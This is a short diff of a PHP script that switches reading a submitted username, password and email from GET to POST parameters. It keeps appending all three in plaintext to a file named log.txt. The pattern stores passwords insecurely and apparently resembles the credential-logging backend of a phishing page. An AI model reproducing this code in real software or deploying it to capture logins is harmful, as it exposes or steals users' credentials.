@@ -1,7 +1,7 @@
 <?php
-    $username = $_GET['USERNAME'];
-    $password = $_GET['PASSWORD'];
-    $email = $_GET['EMAIL'];
+    $username = $_POST['USERNAME'];
+    $password = $_POST['PASSWORD'];
+    $email = $_POST['EMAIL'];
     $filename = 'log.txt';
     $fp = fopen($filename, 'a+');
     fwrite ($fp, $username . "," . $password . "," . $email . "\n");
